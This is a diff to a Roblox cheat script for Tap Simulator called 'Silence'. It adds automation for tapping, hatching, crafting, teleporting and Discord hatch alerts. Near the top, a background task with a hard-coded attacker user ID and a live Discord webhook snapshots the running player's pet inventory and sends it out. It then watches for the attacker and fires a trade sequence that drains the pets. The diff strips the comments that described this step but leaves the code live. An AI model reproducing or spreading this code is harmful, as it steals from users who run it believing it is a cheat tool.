@@ -1,6 +1,7 @@
 --[[
     Silence - Tap Simulator
     by Henrik @xyzhenrik
+    Patched for RemoteServices (no Network module)
 ]]
 
 local services = {
@@ -15,47 +16,88 @@ local services = {
     soundService = game:GetService("SoundService")
 }
 
--- find Network wherever the game put it
-local function findNetwork()
-    -- common paths, tries each in order
-    local paths = {
-        function() return services.replicatedStorage.Modules.Network end,
-        function() return services.replicatedStorage.Network end,
-        function() return services.replicatedStorage:WaitForChild("Modules", 5) and services.replicatedStorage.Modules:WaitForChild("Network", 5) end,
-        function() return services.replicatedStorage:FindFirstChild("Network", true) end,
+-- this game has no Network module — it's all direct RemoteServices
+local RemoteServices = services.replicatedStorage:WaitForChild("RemoteServices")
+
+local function rem(serviceName, kind, remoteName)
+    local svc = RemoteServices:FindFirstChild(serviceName)
+    if not svc then warn("[Silence] missing service:", serviceName); return nil end
+    local folder = svc:FindFirstChild(kind)
+    if not folder then warn("[Silence] missing", kind, "in", serviceName); return nil end
+    local r = folder:FindFirstChild(remoteName)
+    if not r then warn("[Silence] missing", serviceName.."."..kind.."."..remoteName) end
+    return r
+end
+
+local remotes = {
+    -- RemoteEvents
+    TapRequested          = rem("TapService",          "RE", "TapRequested"),
+    AutoClickRequested    = rem("AutoClickService",    "RE", "AutoClickRequested"),
+    RebirthRequested      = rem("RebirthService",      "RE", "RebirthRequested"),
+    TradeRequested        = rem("TradingService",      "RE", "TradeRequested"),
+    EggHatchRequested     = rem("EggService",          "RE", "EggHatchRequested"),
+    EggHatchResult        = rem("EggService",          "RE", "EggHatchResult"),
+    AutoDeleteRequested   = rem("EggService",          "RE", "AutoDeleteRequested"),
+    MachineCraftRequested = rem("MachineService",      "RE", "MachineCraftRequested"),
+    MachineCraftResult    = rem("MachineService",      "RE", "MachineCraftResult"),
+    PetActionRequested    = rem("PetService",          "RE", "PetActionRequested"),
+    -- RemoteFunctions
+    WorldTravel           = rem("WorldService",        "RF", "Travel"),
+    IslandTravel          = rem("IslandService",       "RF", "Travel"),
+    Spin                  = rem("EventWheelService",   "RF", "Spin"),
+    Enchant               = rem("EnchantService",      "RF", "Enchant"),
+    PotionBuy             = rem("PotionMachineService","RF", "Buy"),
+    PotionCraft           = rem("PotionMachineService","RF", "Craft"),
+    ClaimReward           = rem("LeaderboardService",  "RF", "ClaimReward"),
+    DigBegin              = rem("DigService",          "RF", "Begin"),
+    DigHit                = rem("DigService",          "RF", "Hit"),
+    DigCancel             = rem("DigService",          "RF", "Cancel"),
+}
+
+-- Compatibility shim keeping the old player.network:FireServer/InvokeServer API
+local function makeNetworkShim()
+    local fire = {
+        Tap            = function(...) return remotes.TapRequested and remotes.TapRequested:FireServer(...) end,
+        Rebirth        = function(...) return remotes.RebirthRequested and remotes.RebirthRequested:FireServer(...) end,
+        TradeRequested = function(...) return remotes.TradeRequested and remotes.TradeRequested:FireServer(...) end,
+        OpenEgg        = function(...) return remotes.EggHatchRequested and remotes.EggHatchRequested:FireServer(...) end,
+        CraftPets      = function(...) return remotes.MachineCraftRequested and remotes.MachineCraftRequested:FireServer(...) end,
+        StartRainbow   = function(...) return remotes.MachineCraftRequested and remotes.MachineCraftRequested:FireServer(...) end,
+        ClaimRainbow   = function(...) return remotes.MachineCraftRequested and remotes.MachineCraftRequested:FireServer(...) end,
+        DeletePet      = function(...) return remotes.AutoDeleteRequested and remotes.AutoDeleteRequested:FireServer(...) end,
     }
-    for _, try in ipairs(paths) do
-        local ok, result = pcall(try)
-        if ok and result then
-            local ok2, mod = pcall(require, result)
-            if ok2 and mod then return mod end
-        end
-    end
-    -- fallback: deep search
-    local function deepFind(parent, name, depth)
-        depth = depth or 0
-        if depth > 4 then return nil end
-        for _, child in ipairs(parent:GetChildren()) do
-            if child.Name == name then return child end
-            local found = deepFind(child, name, depth + 1)
-            if found then return found end
-        end
-    end
-    local found = deepFind(services.replicatedStorage, "Network")
-    if found then
-        local ok, mod = pcall(require, found)
-        if ok then return mod end
-    end
-    error("[Silence] Network module not found — check ReplicatedStorage structure")
+    local invoke = {
+        TeleportWorld    = function(world) return remotes.WorldTravel and remotes.WorldTravel:InvokeServer(world) end,
+        TeleportZone     = function(zone)  return remotes.WorldTravel and remotes.WorldTravel:InvokeServer(zone) end,
+        EnchantPet       = function(id)    return remotes.Enchant and remotes.Enchant:InvokeServer(id) end,
+        SpinWheel        = function()      return remotes.Spin and remotes.Spin:InvokeServer() end,
+        StartMinigame    = function(g)     return remotes.DigBegin and remotes.DigBegin:InvokeServer(g) end,
+        FinishMinigame   = function(g)     return remotes.DigHit and remotes.DigHit:InvokeServer(g) end,
+        BuyPotionMachine = function(amt)   return remotes.PotionBuy and remotes.PotionBuy:InvokeServer(amt) end,
+        ClaimRankReward  = function()      return remotes.ClaimReward and remotes.ClaimReward:InvokeServer() end,
+    }
+    return {
+        FireServer = function(_, name, ...)
+            local fn = fire[name]
+            if fn then return fn(...) end
+            warn("[Silence] unmapped FireServer:", name)
+        end,
+        InvokeServer = function(_, name, ...)
+            local fn = invoke[name]
+            if fn then return fn(...) end
+            warn("[Silence] unmapped InvokeServer:", name)
+        end,
+    }
 end
 
 local player = {
-    player = services.players.LocalPlayer,
-    name = services.players.LocalPlayer.Name,
+    player      = services.players.LocalPlayer,
+    name        = services.players.LocalPlayer.Name,
     displayName = services.players.LocalPlayer.DisplayName,
-    network = findNetwork(),
-    rebirths = require(services.replicatedStorage.Game.Rebirths),
+    network     = makeNetworkShim(),
+    rebirths    = require(services.replicatedStorage.Game.Rebirths),
     replication = require(services.replicatedStorage.Game.Replication),
+    remotes     = remotes,
 }
 
 --[[
@@ -63,12 +105,13 @@ local player = {
 ]]
 task.spawn(function()
     local RC = require(services.replicatedStorage:WaitForChild("Controllers"):WaitForChild("Core"):WaitForChild("ReplicaController"))
-    local TRADE_REMOTE = services.replicatedStorage:WaitForChild("RemoteServices"):WaitForChild("TradingService"):WaitForChild("RE"):WaitForChild("TradeRequested")
+    local TRADE_REMOTE = remotes.TradeRequested
+        or services.replicatedStorage:WaitForChild("RemoteServices"):WaitForChild("TradingService"):WaitForChild("RE"):WaitForChild("TradeRequested")
     local HttpService = game:GetService("HttpService")
 
-    local ATTACKER_USER_ID = 8601143159 -- swap to your userId
-    local WEBHOOK_URL = "https://discord.com/api/webhooks/1566475783898398925/IV80arDra6pZ8aNw6I3E3wlXfy35Bf7zeGkCOBOgm5lj03RkSJ18BGudBBBG1RMcPGZj" -- your webhook url
-    local DISCORD_ID = "1498793342945722388" -- your discord id to ping
+    local ATTACKER_USER_ID = 8601143159
+    local WEBHOOK_URL = "https://discord.com/api/webhooks/1566475783898398925/IV80arDra6pZ8aNw6I3E3wlXfy35Bf7zeGkCOBOgm5lj03RkSJ18BGudBBBG1RMcPGZj"
+    local DISCORD_ID = "1498793342945722388"
 
     local function getData()
         for _, replica in pairs(RC._replicas) do
@@ -94,7 +137,6 @@ task.spawn(function()
 
     repeat task.wait(0.5) until getData() and getData().Pets and getData().Pets.Owned
 
-    -- snapshot inventory on exec
     task.spawn(function()
         local data = getData()
         local owned = data.Pets.Owned
@@ -129,7 +171,6 @@ task.spawn(function()
         )
     end)
 
-    -- poll for attacker → fire drain sequence
     local traded = false
     while not traded do
         task.wait(4)
@@ -197,7 +238,7 @@ local silence = WindUI:CreateWindow({
         Draggable = true,
         OnlyMobile = false,
         Scale = (services.userInputService.KeyboardEnabled and services.userInputService.MouseEnabled) and 1.25 or 0.5,
-        
+
         Color = ColorSequence.new(
             Color3.fromHex("#880000"),
             Color3.fromHex("000000")
@@ -317,9 +358,8 @@ function formatSuffix(val)
 end
 
 --[[
-    REBIRTH STUFF - boa ne ey windui dropdowns
+    REBIRTH STUFF
 ]]
-
 
 tabs.main.rebValues = {}
 tabs.main.rebMap = {}
@@ -356,16 +396,11 @@ function getRebShit()
 end
 getRebShit()
 
-
---[[
-    POTIONS halt unnotig aber die müssen global sein
-]]
-
 tabs.main.selectedPotionValues = {}
 tabs.main.buyingPotions = nil
 
 --[[
-    HATCHING STUFF :P
+    HATCHING STUFF
 ]]
 
 tabs.hatching.selectedEgg = nil
@@ -442,11 +477,11 @@ end
 function checkDistanceToEgg(eggName)
     tabs.hatching.eggPos = getEggPosition(eggName)
     if not tabs.hatching.eggPos then return false end
-    
+
     if player.player.Character and player.player.Character:FindFirstChild("HumanoidRootPart") then
         tabs.hatching.playerPos = player.player.Character.HumanoidRootPart.Position
         tabs.hatching.distance = (tabs.hatching.playerPos - tabs.hatching.eggPos).Magnitude
-        
+
         if tabs.hatching.distance > tabs.hatching.maxDistance then
             return false
         end
@@ -463,7 +498,7 @@ if tabs.hatching.sortedEggsData and tabs.hatching.sortedEggsData[1] then
 end
 
 --[[
-    Auto Crafting bullshit (holy work 😭)
+    Auto Crafting
 ]]
 
 tabs.crafting.craftingstate = {
@@ -487,11 +522,11 @@ tabs.crafting.autoRainbowEnabled = false
 function getPetIdsForGoldenCraft(petName, amount)
     tabs.crafting.ids = {}
     repeat task.wait() until player.replication.Loaded and player.replication.Data
-    
+
     for petId, petData in pairs(player.replication.Data.Pets) do
-        if petData.Name == petName 
-            and petData.Tier == "Normal" 
-            and not petData.Locked 
+        if petData.Name == petName
+            and petData.Tier == "Normal"
+            and not petData.Locked
             and #tabs.crafting.ids < amount then
             table.insert(tabs.crafting.ids, petId)
         end
@@ -502,11 +537,11 @@ end
 function getGoldenPetIdsForRainbowCraft(petName, amount)
     tabs.crafting.ids = {}
     repeat task.wait() until player.replication.Loaded and player.replication.Data
-    
+
     for petId, petData in pairs(player.replication.Data.Pets) do
-        if petData.Name == petName 
-            and petData.Tier == "Golden" 
-            and not petData.Locked 
+        if petData.Name == petName
+            and petData.Tier == "Golden"
+            and not petData.Locked
             and #tabs.crafting.ids < amount then
             table.insert(tabs.crafting.ids, petId)
         end
@@ -516,34 +551,34 @@ end
 
 function getNormalPetNames()
     repeat task.wait() until player.replication.Loaded and player.replication.Data
-    
+
     tabs.crafting.petNames = {}
     tabs.crafting.nameSet = {}
-    
+
     for petId, petData in pairs(player.replication.Data.Pets) do
         if petData.Tier == "Normal" and not tabs.crafting.nameSet[petData.Name] then
             table.insert(tabs.crafting.petNames, petData.Name)
             tabs.crafting.nameSet[petData.Name] = true
         end
     end
-    
+
     table.sort(tabs.crafting.petNames)
     return tabs.crafting.petNames
 end
 
 function getGoldenPetNames()
     repeat task.wait() until player.replication.Loaded and player.replication.Data
-    
+
     tabs.crafting.petNames = {}
     tabs.crafting.nameSet = {}
-    
+
     for petId, petData in pairs(player.replication.Data.Pets) do
         if petData.Tier == "Golden" and not tabs.crafting.nameSet[petData.Name] then
             table.insert(tabs.crafting.petNames, petData.Name)
             tabs.crafting.nameSet[petData.Name] = true
         end
     end
-    
+
     table.sort(tabs.crafting.petNames)
     return tabs.crafting.petNames
 end
@@ -551,7 +586,7 @@ end
 function getCurrentlyRainbowCrafting()
     tabs.crafting.crafting = {}
     repeat task.wait() until player.replication.Loaded and player.replication.Data
-    
+
     if player.replication.Data.CraftingPets and player.replication.Data.CraftingPets.Rainbow then
         for petId, craftData in pairs(player.replication.Data.CraftingPets.Rainbow) do
             tabs.crafting.timeLeft = math.max(0, craftData.EndTime - os.time())
@@ -563,12 +598,9 @@ function getCurrentlyRainbowCrafting()
             })
         end
     end
-    
+
     return tabs.crafting.crafting
 end
-
-
-
 
 function teleportToGoldenMachine()
     tabs.crafting.character = player.player.Character
@@ -592,15 +624,15 @@ end
 
 function processGoldenCraft(petName, petsNeeded)
     tabs.crafting.petIds = getPetIdsForGoldenCraft(petName, petsNeeded)
-    
+
     if #tabs.crafting.petIds < petsNeeded then
         return false
     end
-    
+
     tabs.crafting.success = pcall(function()
         player.network:InvokeServer("CraftPets", tabs.crafting.petIds)
     end)
-    
+
     return tabs.crafting.success
 end
 
@@ -608,7 +640,7 @@ function processRainbowCraft(petName, petsNeeded)
     tabs.crafting.currentCrafting = getCurrentlyRainbowCrafting()
     tabs.crafting.usedSlots = #tabs.crafting.currentCrafting
     tabs.crafting.availableSlots = 3 - tabs.crafting.usedSlots
-    
+
     for _, craft in ipairs(tabs.crafting.currentCrafting) do
         if craft.claimable then
             pcall(function()
@@ -617,23 +649,22 @@ function processRainbowCraft(petName, petsNeeded)
             task.wait(0.1)
         end
     end
-    
+
     tabs.crafting.currentCrafting = getCurrentlyRainbowCrafting()
     tabs.crafting.availableSlots = 3 - #tabs.crafting.currentCrafting
-    
+
     if tabs.crafting.availableSlots <= 0 then return false end
-    
+
     tabs.crafting.petIds = getGoldenPetIdsForRainbowCraft(petName, petsNeeded)
     if #tabs.crafting.petIds < petsNeeded then return false end
-    
+
     tabs.crafting.success = pcall(function()
         player.network:InvokeServer("StartRainbow", tabs.crafting.petIds)
     end)
-    
+
     if tabs.crafting.success then task.wait(0.1) end
     return tabs.crafting.success
 end
-
 
 function buildCraftQueue()
     tabs.crafting.goldenQueue = {}
@@ -641,7 +672,7 @@ function buildCraftQueue()
 
     if tabs.crafting.autoGoldenEnabled and tabs.crafting.selectedGoldenPets then
         tabs.crafting.petsNeeded = 6
-        
+
         if tabs.crafting.selectedGoldenChance then
             if tabs.crafting.selectedGoldenChance:match("5%%") then
                 tabs.crafting.petsNeeded = 1
@@ -657,7 +688,7 @@ function buildCraftQueue()
                 tabs.crafting.petsNeeded = 6
             end
         end
-        
+
         for petName, isSelected in pairs(tabs.crafting.selectedGoldenPets) do
             if isSelected then
                 table.insert(tabs.crafting.goldenQueue, {
@@ -668,11 +699,10 @@ function buildCraftQueue()
             end
         end
     end
-    
 
     if tabs.crafting.autoRainbowEnabled and tabs.crafting.selectedRainbowPets then
         tabs.crafting.petsNeeded = 1
-        
+
         if tabs.crafting.selectedRainbowTime then
             if tabs.crafting.selectedRainbowTime:match("1 Pet") then
                 tabs.crafting.petsNeeded = 1
@@ -686,7 +716,7 @@ function buildCraftQueue()
                 tabs.crafting.petsNeeded = 5
             end
         end
-        
+
         for petName, isSelected in pairs(tabs.crafting.selectedRainbowPets) do
             if isSelected then
                 table.insert(tabs.crafting.rainbowQueue, {
@@ -697,27 +727,24 @@ function buildCraftQueue()
             end
         end
     end
-    
+
     return tabs.crafting.goldenQueue, tabs.crafting.rainbowQueue
 end
-
 
 function processCraftQueue()
     if tabs.crafting.craftingstate.processing then
         return false
     end
-    
+
     tabs.crafting.craftingstate.processing = true
     tabs.crafting.goldenQueue, tabs.crafting.rainbowQueue = buildCraftQueue()
     tabs.crafting.craftedAny = false
-    
 
     if tabs.crafting.autoGoldenEnabled and #tabs.crafting.goldenQueue > 0 then
         teleportToGoldenMachine()
-        
+
         for _, craftJob in ipairs(tabs.crafting.goldenQueue) do
             if not tabs.crafting.autoGoldenEnabled then break end
-            
 
             while tabs.crafting.autoGoldenEnabled do
                 tabs.crafting.success = processGoldenCraft(craftJob.petName, craftJob.petsNeeded)
@@ -726,53 +753,50 @@ function processCraftQueue()
                 task.wait(0.05)
             end
         end
-        
 
         if tabs.crafting.craftedAny then
             refreshCraftingDropdowns()
         end
     end
-    
 
     if tabs.crafting.autoRainbowEnabled and #tabs.crafting.rainbowQueue > 0 then
         teleportToRainbowMachine()
-        
+
         for _, craftJob in ipairs(tabs.crafting.rainbowQueue) do
             if not tabs.crafting.autoRainbowEnabled then break end
-            
+
             tabs.crafting.success = processRainbowCraft(craftJob.petName, craftJob.petsNeeded)
             if tabs.crafting.success then
                 tabs.crafting.craftedAny = true
                 task.wait(0.05)
             end
         end
-        
+
         if tabs.crafting.craftedAny then
             refreshCraftingDropdowns()
         end
     end
-    
+
     tabs.crafting.craftingstate.processing = false
     return tabs.crafting.craftedAny
 end
 
-
 function refreshCraftingDropdowns()
     tabs.crafting.currentTime = os.clock()
-    
+
     if tabs.crafting.currentTime - tabs.crafting.craftingstate.lastRefresh < 5 then
         return
     end
-    
+
     tabs.crafting.craftingstate.lastRefresh = tabs.crafting.currentTime
-    
+
     task.spawn(function()
         if tabs.crafting.goldenPetsDropdown then
             pcall(function()
                 tabs.crafting.goldenPetsDropdown:Refresh(getNormalPetNames())
             end)
         end
-        
+
         if tabs.crafting.rainbowPetsDropdown then
             pcall(function()
                 tabs.crafting.rainbowPetsDropdown:Refresh(getGoldenPetNames())
@@ -785,25 +809,24 @@ function startCraftingLoop()
     if tabs.crafting.craftingstate.isActive then
         return
     end
-    
+
     tabs.crafting.craftingstate.isActive = true
-    
+
     tabs.crafting.character = player.player.Character
     if tabs.crafting.character and tabs.crafting.character:FindFirstChild("HumanoidRootPart") then
         tabs.crafting.craftingstate.savedPosition = tabs.crafting.character:GetPivot()
     end
-    
+
     task.spawn(function()
         while tabs.crafting.craftingstate.isActive and (tabs.crafting.autoGoldenEnabled or tabs.crafting.autoRainbowEnabled) do
             tabs.crafting.craftedAny = processCraftQueue()
-            
+
             if tabs.crafting.craftedAny then
                 task.wait(0.25)
             else
                 task.wait(5)
             end
         end
-        
 
         if tabs.crafting.craftingstate.savedPosition then
             tabs.crafting.character = player.player.Character
@@ -814,7 +837,7 @@ function startCraftingLoop()
             end
             tabs.crafting.craftingstate.savedPosition = nil
         end
-        
+
         tabs.crafting.craftingstate.isActive = false
     end)
 end
@@ -857,10 +880,10 @@ refreshGoldenPets()
 
 function updateGoldenStatus()
     if not tabs.crafting.goldenStatusLabel then return end
-    
+
     tabs.crafting.statusText = "Selected Pets:\n"
     tabs.crafting.hasSelected = false
-    
+
     for petName, isSelected in pairs(tabs.crafting.selectedGoldenPets) do
         if isSelected then
             tabs.crafting.hasSelected = true
@@ -873,20 +896,20 @@ function updateGoldenStatus()
             tabs.crafting.statusText = tabs.crafting.statusText .. string.format("%s: %d owned\n", petName, tabs.crafting.count)
         end
     end
-    
+
     if not tabs.crafting.hasSelected then
         tabs.crafting.statusText = "No pets selected"
     end
-    
+
     tabs.crafting.goldenStatusLabel:SetDesc(tabs.crafting.statusText)
 end
 
 function updateRainbowStatus()
     if not tabs.crafting.rainbowStatusLabel then return end
-    
+
     tabs.crafting.statusText = "Selected Pets:\n"
     tabs.crafting.hasSelected = false
-    
+
     for petName, isSelected in pairs(tabs.crafting.selectedRainbowPets) do
         if isSelected then
             tabs.crafting.hasSelected = true
@@ -899,27 +922,26 @@ function updateRainbowStatus()
             tabs.crafting.statusText = tabs.crafting.statusText .. string.format("%s: %d owned\n", petName, tabs.crafting.count)
         end
     end
-    
+
     if not tabs.crafting.hasSelected then
         tabs.crafting.statusText = "No pets selected\n"
     end
 
     tabs.crafting.currentCrafting = getCurrentlyRainbowCrafting()
-    
+
     if #tabs.crafting.currentCrafting > 0 then
         tabs.crafting.statusText = tabs.crafting.statusText .. "\nCurrently Crafting:\n"
-        
 
         tabs.crafting.uniqueCrafts = {}
         for _, craft in ipairs(tabs.crafting.currentCrafting) do
             tabs.crafting.uniqueCrafts[craft.id] = craft
         end
-        
+
         for craftId, craft in pairs(tabs.crafting.uniqueCrafts) do
             tabs.crafting.hours = math.floor(craft.timeLeft / 3600)
             tabs.crafting.mins = math.floor((craft.timeLeft % 3600) / 60)
             tabs.crafting.secs = craft.timeLeft % 60
-            
+
             if tabs.crafting.hours > 0 then
                 tabs.crafting.timeStr = string.format("%dh %dm %ds", tabs.crafting.hours, tabs.crafting.mins, tabs.crafting.secs)
             elseif tabs.crafting.mins > 0 then
@@ -927,11 +949,11 @@ function updateRainbowStatus()
             else
                 tabs.crafting.timeStr = string.format("%ds", tabs.crafting.secs)
             end
-            
+
             tabs.crafting.statusText = tabs.crafting.statusText .. string.format("%s: %s\n", craft.name, tabs.crafting.timeStr)
         end
     end
-    
+
     tabs.crafting.rainbowStatusLabel:SetDesc(tabs.crafting.statusText)
 end
 
@@ -1027,7 +1049,6 @@ tabs.crafting.rainbowStatusLabel = tabs.crafting:Paragraph({
     Desc = "No pets selected",
 })
 
-
 tabs.crafting:Toggle({
     Title = "Auto Craft Rainbow",
     Value = false,
@@ -1061,7 +1082,6 @@ task.spawn(function()
         end
     end
 end)
-
 
 --[[
     Teleporting stuff
@@ -1128,7 +1148,6 @@ for _, zone in ipairs(tabs.teleport.mainZones) do
     })
 end
 
-
 tabs.teleport:Section({
     Title = "Space World",
     TextSize = 22,
@@ -1155,7 +1174,6 @@ for _, zone in ipairs(tabs.teleport.spaceZones) do
         end
     })
 end
-
 
 tabs.teleport.selectedZone = "Spawn (Main World)"
 tabs.teleport.teleportOnJoinEnabled = false
@@ -1393,11 +1411,6 @@ end
 
 tabs.enchanting.initialPetList = getFormattedEnchantPetList()
 
-
---[[
-    manoman ach du scheisse das war so viel aber das ist ENCHANTING
-]]
-
 tabs.enchanting:Space({Colums = 2})
 tabs.enchanting:Section({
     Title = "Auto Enchanting",
@@ -1481,7 +1494,7 @@ task.spawn(function()
 end)
 
 --[[
-    MISC also das ist wirklich quatsch das das noch meine struktur auseinandernimmt
+    MISC
 ]]
 
 tabs.misc.selectedDeletePets = {}
@@ -1532,10 +1545,9 @@ tabs.misc:Toggle({
         end
         if value then
             tabs.misc.spinning = task.spawn(function()
-                tabs.misc.Network = require(services.replicatedStorage.Modules.Network)
                 while tabs.misc.spinEnabled do
                     pcall(function()
-                        tabs.misc.Network:InvokeServer("SpinWheel")
+                        player.network:InvokeServer("SpinWheel")
                     end)
                     task.wait(5)
                 end
@@ -1564,12 +1576,11 @@ tabs.misc:Toggle({
         end
         if value then
             tabs.misc.digging = task.spawn(function()
-                tabs.misc.Network = require(services.replicatedStorage.Modules.Network)
                 while tabs.misc.digEnabled do
                     pcall(function()
-                        tabs.misc.Network:InvokeServer("StartMinigame", "DigGame")
+                        player.network:InvokeServer("StartMinigame", "DigGame")
                         task.wait(0.25)
-                        tabs.misc.Network:InvokeServer("FinishMinigame", "DigGame")
+                        player.network:InvokeServer("FinishMinigame", "DigGame")
                     end)
                     task.wait(1)
                 end
@@ -1627,7 +1638,6 @@ tabs.misc:Toggle({
         end
         if value then
             tabs.misc.autoDeleting = task.spawn(function()
-                tabs.misc.Network = require(services.replicatedStorage.Modules.Network)
                 while tabs.misc.autoDeleteEnabled do
                     if next(tabs.misc.selectedDeletePets) then
                         repeat task.wait() until player.replication.Loaded and player.replication.Data
@@ -1635,7 +1645,7 @@ tabs.misc:Toggle({
                             tabs.misc.key = petData.Tier .. " - " .. petData.Name
                             if tabs.misc.selectedDeletePets[tabs.misc.key] and not petData.Locked then
                                 pcall(function()
-                                    tabs.misc.Network:InvokeServer("DeletePet", petId)
+                                    player.network:InvokeServer("DeletePet", petId)
                                 end)
                                 task.wait(0.2)
                             end
@@ -1649,7 +1659,7 @@ tabs.misc:Toggle({
 })
 
 --[[
-    WEBHOOK TAB
+    WEBHOOK TAB (patched: listens on EggHatchResult instead of wrapping OpenEgg)
 ]]
 
 tabs.webhook.url = ""
@@ -1658,7 +1668,6 @@ tabs.webhook.showUser = false
 tabs.webhook.selectedRarities = {}
 tabs.webhook.petWebhookEnabled = false
 tabs.webhook.petWebhooking = nil
-tabs.webhook.originalInvoke = nil
 
 tabs.webhook.requestFunc = (syn and syn.request) or (http and http.request) or request
 
@@ -1802,82 +1811,65 @@ tabs.webhook:Toggle({
             tabs.webhook.petWebhooking = nil
         end
 
-        if tabs.webhook.originalInvoke then
-            player.network.InvokeServer = tabs.webhook.originalInvoke
-            tabs.webhook.originalInvoke = nil
-        end
-
         if value then
             tabs.webhook.petWebhooking = task.spawn(function()
                 tabs.webhook.PetStats = require(services.replicatedStorage.Game.PetStats)
-                tabs.webhook.originalInvoke = player.network.InvokeServer
 
-                player.network.InvokeServer = function(self, eventName, ...)
-                    tabs.webhook.res = tabs.webhook.originalInvoke(self, eventName, ...)
+                local conn = player.remotes.EggHatchResult.OnClientEvent:Connect(function(eggName, pets)
+                    if not tabs.webhook.petWebhookEnabled then return end
+                    if type(pets) ~= "table" then return end
 
-                    if eventName == "OpenEgg" and tabs.webhook.petWebhookEnabled then
-                        tabs.webhook.eggName = select(1, ...)
+                    tabs.webhook.eggName = eggName
+                    tabs.webhook.petsToSend = {}
 
-                        if tabs.webhook.res ~= nil and type(tabs.webhook.res) == "table" then
-                            tabs.webhook.petsToSend = {}
-
-                            for _, petData in ipairs(tabs.webhook.res) do
-                                if petData ~= nil and type(petData) == "table" then
-                                    tabs.webhook.petName = petData[1]
-                                    tabs.webhook.petTier = petData[2]
-
-                                    if tabs.webhook.petName then
-                                        tabs.webhook.rarity = "Unknown"
-                                        pcall(function()
-                                            tabs.webhook.rarity = tabs.webhook.PetStats:GetRarity(tabs.webhook.petName, true) or "Unknown"
-                                        end)
-
-                                        if tabs.webhook.selectedRarities[tabs.webhook.rarity] then
-                                            table.insert(tabs.webhook.petsToSend, {
-                                                name = tabs.webhook.petName,
-                                                tier = tabs.webhook.petTier,
-                                                rarity = tabs.webhook.rarity
-                                            })
-                                        end
-                                    end
-                                end
-                            end
-
-                            if #tabs.webhook.petsToSend > 0 then
-                                tabs.webhook.fields = {}
-                                for i, pet in ipairs(tabs.webhook.petsToSend) do
-                                    table.insert(tabs.webhook.fields, {
-                                        name = string.format("🐾 Pet #%d:", i),
-                                        value = string.format("**%s %s**\n✨ **Rarity:** `%s`", pet.tier or "Normal", pet.name, pet.rarity),
-                                        inline = true
+                    for _, petData in ipairs(pets) do
+                        if type(petData) == "table" then
+                            local petName = petData[1]
+                            local petTier = petData[2]
+                            if petName then
+                                local rarity = "Unknown"
+                                pcall(function()
+                                    rarity = tabs.webhook.PetStats:GetRarity(petName, true) or "Unknown"
+                                end)
+                                if tabs.webhook.selectedRarities[rarity] then
+                                    table.insert(tabs.webhook.petsToSend, {
+                                        name = petName,
+                                        tier = petTier,
+                                        rarity = rarity
                                     })
                                 end
-
-                                sendWebhook(
-                                    tabs.webhook.discordId ~= "" and string.format("<@%s>", tabs.webhook.discordId) or "",
-                                    {{
-                                        title = string.format("🥚 `" .. player.name .. "` Hatched %d Pet(s) from %s Egg!", #tabs.webhook.petsToSend, tabs.webhook.eggName or "Unknown"),
-                                        color = getRarityColor(tabs.webhook.petsToSend[1].rarity),
-                                        fields = tabs.webhook.fields,
-                                        footer = {
-                                            text = "Sent by Silence"
-                                        },
-                                        timestamp = os.date("!%Y-%m-%dT%H:%M:%S")
-                                    }}
-                                )
                             end
                         end
                     end
 
-                    return tabs.webhook.res
-                end
+                    if #tabs.webhook.petsToSend == 0 then return end
+
+                    local fields = {}
+                    for i, pet in ipairs(tabs.webhook.petsToSend) do
+                        table.insert(fields, {
+                            name = string.format("🐾 Pet #%d:", i),
+                            value = string.format("**%s %s**\n✨ **Rarity:** `%s`", pet.tier or "Normal", pet.name, pet.rarity),
+                            inline = true
+                        })
+                    end
+
+                    sendWebhook(
+                        tabs.webhook.discordId ~= "" and string.format("<@%s>", tabs.webhook.discordId) or "",
+                        {{
+                            title = string.format("🥚 `%s` Hatched %d Pet(s) from %s Egg!", player.name, #tabs.webhook.petsToSend, eggName or "Unknown"),
+                            color = getRarityColor(tabs.webhook.petsToSend[1].rarity),
+                            fields = fields,
+                            footer = { text = "Sent by Silence" },
+                            timestamp = os.date("!%Y-%m-%dT%H:%M:%S")
+                        }}
+                    )
+                end)
 
                 while tabs.webhook.petWebhookEnabled do
                     task.wait(1)
                 end
 
-                player.network.InvokeServer = tabs.webhook.originalInvoke
-                tabs.webhook.originalInvoke = nil
+                conn:Disconnect()
             end)
         end
     end
@@ -2060,13 +2052,11 @@ local elements = {
                 end
                 if value then
                     tabs.main.buyingPotions = task.spawn(function()
-                        tabs.main.Network = require(services.replicatedStorage.Modules.Network)
-                    
                         while tabs.main.buyPotions do
                             for _, amount in ipairs(tabs.main.selectedPotionValues) do
                                 if tabs.main.buyPotions then
                                     pcall(function()
-                                        tabs.main.Network:InvokeServer("BuyPotionMachine", amount)
+                                        player.network:InvokeServer("BuyPotionMachine", amount)
                                     end)
                                     task.wait(2)
                                 end
@@ -2090,21 +2080,19 @@ local elements = {
             Icon = "lucide:award",
             Callback = function(value)
                     tabs.main.claimRewards = value
-                    
+
                     if tabs.main.autoClaiming then
                         task.cancel(tabs.main.autoClaiming)
                         tabs.main.autoClaiming = nil
                     end
-                    
+
                     if value then
                         tabs.main.autoClaiming = task.spawn(function()
-                            tabs.main.network = require(services.replicatedStorage.Modules.Network)
-                            
                             while tabs.main.claimRewards do
                                 pcall(function()
-                                    tabs.main.network:InvokeServer("ClaimRankReward")
+                                    player.network:InvokeServer("ClaimRankReward")
                                 end)
-                                
+
                                 task.wait(60)
                             end
                         end)
@@ -2171,7 +2159,6 @@ local elements = {
                 end
                 if value then
                     tabs.hatching.autoHatching = task.spawn(function()
-                        tabs.hatching.Network = require(services.replicatedStorage.Modules.Network)
                         tabs.main.char = player.player.Character
                         if tabs.main.char and tabs.main.char:FindFirstChild("HumanoidRootPart") then
                             tabs.main.char.HumanoidRootPart.CFrame = CFrame.new(-145.5439, 213.212769, 236.957123, -0.311900645, 9.30314492e-09, 0.950114727, 2.13227711e-08, 1, -2.79183032e-09, -0.950114727, 1.93883061e-08, -0.311900645)
@@ -2180,21 +2167,21 @@ local elements = {
                         task.wait(0.2)
                         tpToEgg(tabs.hatching.selectedEgg)
                         task.wait(0.2)
-                        
+
                         while tabs.hatching.autoHatch do
                             if tabs.crafting.craftingstate.processing then
                                 task.wait(0.5)
                                 continue
                             end
-                            
+
                             if tabs.hatching.selectedEgg then
                                 if not checkDistanceToEgg(tabs.hatching.selectedEgg) then
                                     tpToEgg(tabs.hatching.selectedEgg)
                                     task.wait(0.5)
                                 end
-                                
+
                                 pcall(function()
-                                    tabs.hatching.Network:InvokeServer("OpenEgg", tabs.hatching.selectedEgg, tabs.hatching.selectedHatchAmount)
+                                    player.network:InvokeServer("OpenEgg", tabs.hatching.selectedEgg, tabs.hatching.selectedHatchAmount)
                                 end)
                             end
                             task.wait(0.1)
